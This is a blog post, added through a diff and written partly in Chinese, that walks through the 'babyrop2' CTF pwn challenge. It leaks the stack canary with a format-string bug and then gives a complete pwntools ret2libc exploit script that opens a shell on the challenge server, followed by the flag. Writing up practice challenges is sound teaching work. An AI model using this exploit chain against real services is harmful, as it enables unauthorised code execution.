@@ -1,0 +1,152 @@
+---
+layout: post
+title:  babyrop2
+date:   2021-08-01 00:01:01 +0300
+image:  2021-08-01-train.jpg
+tags:   [ctf,Pwn,Fmtstr,ubuntu16,ROP]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  gift(argc, argv);
+  vuln();
+  return 0;
+}
+```
+
+init
+
+```assembly
+unsigned __int64 init()
+{
+  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
+
+  v1 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  puts("Can u return to libc ?");
+  puts("Try u best!");
+  return __readfsqword(0x28u) ^ v1;
+}
+```
+
+通过字符串的提示，可以知道要泄露libc
+
+gift
+
+```assembly
+unsigned __int64 gift()
+{
+  char format[8]; // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  puts("I'll give u some gift to help u!");
+  __isoc99_scanf("%6s", format);
+  printf(format);
+  puts(byte_400A05);
+  fflush(0LL);
+  return __readfsqword(0x28u) ^ v2;
+}
+```
+
+有一个格式化字符串漏洞
+
+vuln
+
+```assembly
+unsigned __int64 vuln()
+{
+  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  puts("Pull up your sword and tell me u story!");
+  read(0, buf, 0x64uLL);
+  return __readfsqword(0x28u) ^ v2;
+}
+```
+
+首先计算偏移量，要注意这里只能输入6个字符，可以逐次尝试得到偏移
+
+```assembly
+[*] Switching to interactive mode
+Can u return to libc ?
+Try u best!
+I'll give u some gift to help u!
+aa%6$p
+aa0x702436256161
+```
+
+%p表示按十六进制输出数据，如果输出数据不够8位数，则左边补零。
+
+看栈的情况
+
+```assembly
+-0000000000000010 format          db 8 dup(?)
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+```
+
+canary是在rbp+8，也就是偏移为%7$p
+
+然后利用rop拿下
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+io = remote("node4.buuoj.cn", 25599)
+
+payload = "%7$p"
+io.recvuntil("I'll give u some gift to help u!\n")
+io.sendline(payload)
+
+canary = int(io.recvuntil("\n"), 16)
+print(hex(canary))
+
+pop_rdi = 0x400993
+puts_got = 0x601018
+puts_plt = 0x400610
+vuln = 0x0400887
+payload = "a"*24 + p64(canary) + p64(0xdeadbeaf)
+payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
+io.recvuntil("story!\n")
+io.sendline(payload)
+
+addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
+print(hex(addr))
+
+libc = LibcSearcher("puts", addr)
+base = addr - libc.dump("puts")
+system = base + libc.dump("system")
+binsh = base + libc.dump("str_bin_sh")
+
+payload = "a"*24 + p64(canary) + p64(0xdeadbeaf)
+payload += p64(pop_rdi) + p64(binsh) + p64(system) + p64(vuln)
+io.recvuntil("story!\n")
+io.sendline(payload)
+
+io.interactive()
+```
+
+Multi Results:
+ 0: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386)
+ 1: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386)
+ 2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386)
+ 3: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386)
+ 4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
+Please supply more info using
+        add_condition(leaked_func, leaked_address).
+You can choose it by hand
+Or type 'exit' to quit:4
+[+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.
+
+得到flag
+
+flag{b5be8483-e232-4152-8ca7-99cf8531333c}
